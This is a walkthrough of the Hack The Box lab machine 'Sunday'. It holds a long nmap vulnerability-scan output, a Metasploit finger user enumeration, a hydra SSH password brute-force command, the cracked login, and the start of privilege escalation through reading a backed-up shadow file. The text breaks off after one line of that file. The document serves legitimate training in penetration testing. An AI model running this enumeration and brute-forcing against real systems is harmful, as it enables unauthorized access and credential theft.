# Sunday Walkthrough

![sunday](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Sunday/sunday.png)

## let's first scan our machine with rustscan

```
nmap -vvv -p 79,111,515,6787,22022 -A -O --script=vuln
```

### Result

```
PORT      STATE SERVICE  REASON         VERSION 
79/tcp    open  finger?  syn-ack ttl 59 
| fingerprint-strings:  
|   GenericLines:  
|     No one logged on 
|   GetRequest:  
|     Login Name TTY Idle When Where 
|     HTTP/1.0 ??? 
|   HTTPOptions:  
|     Login Name TTY Idle When Where 
|     HTTP/1.0 ??? 
|     OPTIONS ??? 
|   Help:  
|     Login Name TTY Idle When Where 
|     HELP ??? 
|   RTSPRequest:  
|     Login Name TTY Idle When Where 
|     OPTIONS ??? 
|     RTSP/1.0 ??? 
|   SSLSessionReq, TerminalServerCookie:  
|_    Login Name TTY Idle When Where 
111/tcp   open  rpcbind  syn-ack ttl 63 2-4 (RPC #100000) 
515/tcp   open  printer? syn-ack ttl 59 
6787/tcp  open  ssl/http syn-ack ttl 59 Apache httpd 2.4.33 ((Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14) 
| http-enum:  
|_  /solaris/: Potentially interesting folder 
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities. 
|_http-jsonp-detection: Couldn't find any JSONP endpoints. 
|_http-server-header: Apache/2.4.33 (Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14 
|_http-dombased-xss: Couldn't find any DOM based XSS. 
|_http-csrf: Couldn't find any CSRF vulnerabilities. 
| vulners:  
|   cpe:/a:apache:http_server:2.4.33:  
|       E899CC4B-A3FD-5288-BB62-A4201F93FDCC    10.0    https://vulners.com/githubexploit/E899CC4B-A3FD-5288-BB62-A4201F93FDCC
*EXPLOIT* 
|       5DE1B404-0368-5986-856A-306EA0FE0C09    10.0    https://vulners.com/githubexploit/5DE1B404-0368-5986-856A-306EA0FE0C09
*EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2020-11984/      7.5     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2020-11984/    *
EXPLOIT* 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2020-11984/        7.5     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-20
20-11984/       *EXPLOIT* 
|       MSF:ILITIES/ORACLE_LINUX-CVE-2020-11984/        7.5     https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-20
20-11984/       *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-11984/      7.5     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP8-CVE-2020-11984/     *EXPLOIT* 
|       MSF:ILITIES/FREEBSD-CVE-2020-11984/     7.5     https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2020-11984/   *
EXPLOIT* 
|       MSF:ILITIES/APACHE-HTTPD-CVE-2020-11984/        7.5     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-20
20-11984/       *EXPLOIT* 
|       CVE-2022-23943  7.5     https://vulners.com/cve/CVE-2022-23943 
|       CVE-2022-22720  7.5     https://vulners.com/cve/CVE-2022-22720 
|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790 
|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275 
|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691 
|       CVE-2020-11984  7.5     https://vulners.com/cve/CVE-2020-11984 
|       1337DAY-ID-34882        7.5     https://vulners.com/zdt/1337DAY-ID-34882        *EXPLOIT* 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/ 7.2     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/
*EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/      7.2     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2019-0211/     *EXPLOIT* 
|       EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    7.2     https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4
259C41D8BDA0AB  *EXPLOIT* 
|       EDB-ID:46676    7.2     https://vulners.com/exploitdb/EDB-ID:46676      *EXPLOIT* 
|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211 
|       1337DAY-ID-32502        7.2     https://vulners.com/zdt/1337DAY-ID-32502        *EXPLOIT* 
|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8
*EXPLOIT* 
|       CVE-2022-22721  6.8     https://vulners.com/cve/CVE-2022-22721 
|       CVE-2021-40438  6.8     https://vulners.com/cve/CVE-2021-40438 
|       CVE-2020-35452  6.8     https://vulners.com/cve/CVE-2020-35452 
|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    6.8     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2
*EXPLOIT* 
|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332
*EXPLOIT* 
|       CVE-2021-44224  6.4     https://vulners.com/cve/CVE-2021-44224 
|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/ 6.0     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/
*EXPLOIT* 
|       MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/      6.0     https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE
-2019-0217/     *EXPLOIT* 
|       CVE-2019-10097  6.0     https://vulners.com/cve/CVE-2019-10097 
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217 
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927 
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098 
|       1337DAY-ID-33577        5.8     https://vulners.com/zdt/1337DAY-ID-33577        *EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2018-1333/       5.0     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1333/     *
EXPLOIT* 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2020-9490/ 5.0     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2020-9490/
*EXPLOIT* 
|       MSF:ILITIES/ORACLE_LINUX-CVE-2020-9490/ 5.0     https://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2020-9490/
*EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/       5.0     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2020-1934/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-9490/       5.0     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP9-CVE-2020-9490/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-9490/       5.0     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP8-CVE-2020-9490/      *EXPLOIT* 
|       MSF:ILITIES/FREEBSD-CVE-2020-9490/      5.0     https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2020-9490/    *
EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2020-9490/ 5.0     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2020-9490/
*EXPLOIT* 
|       MSF:ILITIES/APACHE-HTTPD-CVE-2020-9490/ 5.0     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-9490/
*EXPLOIT* 
|       MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2020-9490/   5.0     https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-
CVE-2020-9490/  *EXPLOIT* 
|       CVE-2022-22719  5.0     https://vulners.com/cve/CVE-2022-22719 
|       CVE-2021-36160  5.0     https://vulners.com/cve/CVE-2021-36160 
|       CVE-2021-34798  5.0     https://vulners.com/cve/CVE-2021-34798 
|       CVE-2021-33193  5.0     https://vulners.com/cve/CVE-2021-33193 
|       CVE-2021-26690  5.0     https://vulners.com/cve/CVE-2021-26690 
|       CVE-2020-9490   5.0     https://vulners.com/cve/CVE-2020-9490 
|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934 
|       CVE-2019-17567  5.0     https://vulners.com/cve/CVE-2019-17567 
|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081 
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220 
|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196 
|       CVE-2018-8011   5.0     https://vulners.com/cve/CVE-2018-8011 
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199 
|       CVE-2018-17189  5.0     https://vulners.com/cve/CVE-2018-17189 
|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/       4.9     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2019-0197/      *EXPLOIT* 
|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2020-11993/        4.3     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-20
20-11993/       *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-11993/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP8-CVE-2020-11993/     *EXPLOIT* 
|       MSF:ILITIES/DEBIAN-CVE-2019-10092/      4.3     https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/    *
EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2020-11993/        4.3     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-20
20-11993/       *EXPLOIT* 
|       MSF:ILITIES/APACHE-HTTPD-CVE-2020-11993/        4.3     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-20
20-11993/       *EXPLOIT* 
|       MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/        4.3     https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-20
19-10092/       *EXPLOIT* 
|       MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2020-11993/  4.3     https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-
CVE-2020-11993/ *EXPLOIT* 
|       CVE-2020-11993  4.3     https://vulners.com/cve/CVE-2020-11993 
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092 
|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763 
|       4013EC74-B3C1-5D95-938A-54197A58586D    4.3     https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D
*EXPLOIT* 
|       1337DAY-ID-35422        4.3     https://vulners.com/zdt/1337DAY-ID-35422        *EXPLOIT* 
|       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT* 
|_      PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT* 
| http-slowloris-check:  
|   VULNERABLE: 
|   Slowloris DOS attack 
|     State: LIKELY VULNERABLE 
|     IDs:  CVE:CVE-2007-6750 
|       Slowloris tries to keep many connections to the target web server open and hold 
|       them open as long as possible.  It accomplishes this by opening connections to 
|       the target web server and sending a partial request. By doing so, it starves 
|       the http server's resources causing Denial Of Service. 
|        
|     Disclosure date: 2009-09-17 
|     References: 
|       http://ha.ckers.org/slowloris/ 
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750 
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php 
22022/tcp open  ssh      syn-ack ttl 63 OpenSSH 7.5 (protocol 2.0) 
| vulners:  
|   cpe:/a:openbsd:openssh:7.5:  
|       2C119FFA-ECE0-5E14-A4A4-354A2C38071A    10.0    https://vulners.com/githubexploit/2C119FFA-ECE0-5E14-A4A4-354A2C38071A
*EXPLOIT* 
|       MSF:ILITIES/UBUNTU-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/     *
EXPLOIT* 
|       MSF:ILITIES/SUSE-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/  *EXPLOIT* 
|       MSF:ILITIES/SUSE-CVE-2019-25017/        5.8     https://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/ *EXPLO
IT* 
|       MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/
*EXPLOIT* 
|       MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/     5.8     https://vulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CV
E-2019-6111/    *EXPLOIT* 
|       MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-
2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/      5.8     https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE
-2019-6111/     *EXPLOIT* 
|       MSF:ILITIES/IBM-AIX-CVE-2019-6111/      5.8     https://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/    *
EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP8-CVE-2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP5-CVE-2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP3-CVE-2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP2-CVE-2019-6111/      *EXPLOIT* 
|       MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/
*EXPLOIT* 
|       MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/    5.8     https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/  *
EXPLOIT* 
|       MSF:ILITIES/DEBIAN-CVE-2019-6111/       5.8     https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/     *
EXPLOIT* 
|       MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/
*EXPLOIT* 
|       MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/
*EXPLOIT* 
|       MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/   5.8     https://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-
CVE-2019-6111/  *EXPLOIT* 
|       MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/ 5.8     https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/
*EXPLOIT* 
|       EXPLOITPACK:98FE96309F9524B8C84C508837551A19    5.8     https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C8
4C508837551A19  *EXPLOIT* 
|       EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97    5.8     https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC
9D6DDDD97F9E97  *EXPLOIT* 
|       EDB-ID:46516    5.8     https://vulners.com/exploitdb/EDB-ID:46516      *EXPLOIT* 
|       EDB-ID:46193    5.8     https://vulners.com/exploitdb/EDB-ID:46193      *EXPLOIT* 
|       CVE-2019-6111   5.8     https://vulners.com/cve/CVE-2019-6111 
|       1337DAY-ID-32328        5.8     https://vulners.com/zdt/1337DAY-ID-32328        *EXPLOIT* 
|       1337DAY-ID-32009        5.8     https://vulners.com/zdt/1337DAY-ID-32009        *EXPLOIT* 
|       SSH_ENUM        5.0     https://vulners.com/canvas/SSH_ENUM     *EXPLOIT* 
|       PACKETSTORM:150621      5.0     https://vulners.com/packetstorm/PACKETSTORM:150621      *EXPLOIT* 
|       MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS 5.0     https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS
*EXPLOIT* 
|       EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0    5.0     https://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3
C649B764E13FB0  *EXPLOIT* 
|       EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283    5.0     https://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648
B4D14B75563283  *EXPLOIT* 
|       EDB-ID:45939    5.0     https://vulners.com/exploitdb/EDB-ID:45939      *EXPLOIT* 
|       EDB-ID:45233    5.0     https://vulners.com/exploitdb/EDB-ID:45233      *EXPLOIT* 
|       CVE-2018-15919  5.0     https://vulners.com/cve/CVE-2018-15919 
|       CVE-2018-15473  5.0     https://vulners.com/cve/CVE-2018-15473 
|       CVE-2017-15906  5.0     https://vulners.com/cve/CVE-2017-15906 
|       1337DAY-ID-31730        5.0     https://vulners.com/zdt/1337DAY-ID-31730        *EXPLOIT* 
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617 
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/     4.3     https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE
-2020-14145/    *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP9-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP8-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP5-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/   4.3     https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/ *
EXPLOIT* 
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145 
|       CVE-2019-6110   4.0     https://vulners.com/cve/CVE-2019-6110 
|       CVE-2019-6109   4.0     https://vulners.com/cve/CVE-2019-6109 
|       CVE-2018-20685  2.6     https://vulners.com/cve/CVE-2018-20685 
|       PACKETSTORM:151227      0.0     https://vulners.com/packetstorm/PACKETSTORM:151227      *EXPLOIT* 
|       MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS/        0.0     https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_E
NUMUSERS/       *EXPLOIT* 
|_      1337DAY-ID-30937        0.0     https://vulners.com/zdt/1337DAY-ID-30937        *EXPLOIT* 
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at htt
ps://nmap.org/cgi-bin/submit.cgi?new-service : 
SF-Port79-TCP:V=7.92%I=7%D=4/7%Time=624EC746%P=x86_64-pc-linux-gnu%r(Gener 
SF:icLines,12,"No\x20one\x20logged\x20on\r\n")%r(GetRequest,93,"Login\x20\ 
SF:x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20 
SF:\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20 
SF:\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\ 
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nGET\x20\x20\x2 
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\? 
SF:\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\? 
SF:\?\?\r\n")%r(Help,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20 
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20 
SF:\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\nHELP\x 
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\ 
SF:?\?\?\r\n")%r(HTTPOptions,93,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20 
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20 
SF:\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r 
SF:\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20 
SF:\x20\x20\x20\x20\?\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20 
SF:\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x20\x20\x20\x20\x20\x20\x 
SF:20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(RTSPRequest,93,"Login\x20\x20\ 
SF:x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20 
SF:\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20 
SF:When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\ 
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x2 
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nRTSP/1\.0\x2 
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(SSL 
SF:SessionReq,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x2 
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x2 
SF:0\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\n\x16\x03\x20\ 
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20 
SF:\x20\?\?\?\r\n")%r(TerminalServerCookie,5D,"Login\x20\x20\x20\x20\x20\x 
SF:20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20T 
SF:TY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\ 
SF:x20\x20Where\r\n\x03\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2 
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n"); 
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port 
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete 
Aggressive OS guesses: Oracle Solaris 11 (94%), Oracle Solaris 10 (93%), Oracle Solaris 11 or OpenIndiana (93%), Sun Solaris 1
1.3 (92%), Nexenta OS 3.0 - 3.1.2 (OpenSolaris snv_130 - snv_134f) (91%), Sun Solaris 11 (snv_151a) or OpenIndiana oi_147 (91%
), Sun Solaris 11 (snv_151a) or OpenIndiana oi_147 - oi_151a (91%), Sun OpenSolaris snv_129 (91%), Solaris 12 (90%), Sun Stora
ge 7410 NAS device (90%) 
No exact OS matches for host (test conditions non-ideal). 
TCP/IP fingerprint: 
SCAN(V=7.92%E=4%D=4/7%OT=79%CT=%CU=32946%PV=Y%DS=2%DC=T%G=N%TM=624EC847%P=x86_64-pc-linux-gnu) 
SEQ(SP=FD%GCD=1%ISR=109%CI=I%II=I%TS=7) 
SEQ(SP=FD%GCD=1%ISR=109%TI=I%CI=I%II=I%SS=S%TS=7) 
OPS(O1=ST11M505NW2%O2=ST11M505NW2%O3=NNT11M505NW2%O4=ST11M505NW2%O5=ST11M505NW2%O6=ST11M505) 
WIN(W1=FB1E%W2=FB1E%W3=FA38%W4=FA3B%W5=FA3B%W6=FFF7) 
ECN(R=Y%DF=Y%T=3C%W=FAFA%O=M505NNSNW2%CC=Y%Q=) 
T1(R=Y%DF=Y%T=3C%S=O%A=S+%F=AS%RD=0%Q=) 
T2(R=N) 
T3(R=Y%DF=Y%T=3C%W=FA09%S=O%A=S+%F=AS%O=ST11M505NW2%RD=0%Q=) 
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=) 
T5(R=Y%DF=N%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=) 
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=) 
U1(R=Y%DF=N%T=FF%IPL=70%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G) 
IE(R=Y%DFI=Y%T=FF%CD=S) 
 
Uptime guess: 0.056 days (since Thu Apr  7 15:26:37 2022) 
Network Distance: 2 hops 
TCP Sequence Prediction: Difficulty=253 (Good luck!) 
IP ID Sequence Generation: Incremental 
 
TRACEROUTE (using port 111/tcp) 
HOP RTT       ADDRESS 
1   273.81 ms 10.10.14.1 
2   270.72 ms 10.10.10.76
```

## here we got 79 port open as finger let's search for it's exploit on google we got https://book.hacktricks.xyz/pentesting/pentesting-finger and a metasploit auxiliary

```
use auxiliary/scanner/finger/finger_users
```

## it is for user enumeration let's use this . we use name.txt wordlists from seclists. 

```
msf6 > use auxiliary/scanner/finger/finger_users 
msf6 auxiliary(scanner/finger/finger_users) > show options 
 
Module options (auxiliary/scanner/finger/finger_users): 
 
   Name        Current Setting                      Required  Description 
   ----        ---------------                      --------  ----------- 
   RHOSTS                                           yes       The target host(s), see https://github.com/rapid7/metasploit-f 
                                                              ramework/wiki/Using-Metasploit 
   RPORT       79                                   yes       The target port (TCP) 
   THREADS     1                                    yes       The number of concurrent threads (max one per host) 
   USERS_FILE  /usr/share/metasploit-framework/dat  yes       The file that contains a list of default UNIX accounts. 
               a/wordlists/unix_users.txt 
 
msf6 auxiliary(scanner/finger/finger_users) > set rhosts 10.10.10.76 
rhosts => 10.10.10.76 
msf6 auxiliary(scanner/finger/finger_users) > set users_file /usr/share/wordlists/SecLists/Usernames/Names/names.txt 
users_file => /usr/share/wordlists/SecLists/Usernames/Names/names.txt 
msf6 auxiliary(scanner/finger/finger_users) > exploit 
 
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: noaccess 
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: nobody4 
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: nobody 
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: lp 
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: adm 
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: dladm 
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: netcfg 
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: dhcpserv 
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: ikeuser 
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: netadm 
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: bin 
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: smmsp 
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: root 
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: sammy 
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: sunny 
[+] 10.10.10.76:79        - 10.10.10.76:79 - Found user: sys
```

## here from the finger_users auxiliary we found name of users. on the list of found users only sunny looks working let's try this user for ssh bruteforcing on port 22022 using hydra.

```
hydra -l sunny -P /usr/share/wordlists/SecLists/Passwords/probable-v2-top1575.txt -w 100 -t 4 -c 60 ssh://10.10.10.76 -s 22022
```

## now we have both user as sunny and password as sunday for ssh let's login to ssh 

```
ssh sunny@10.10.10.76 -p 22022
```

## now it's time for priv esc, i find shadow.backup file in backup directory in sunny root directory

```
sunny@sunday:/backup$ cat shadow.backup  
mysql:NP::::::: 
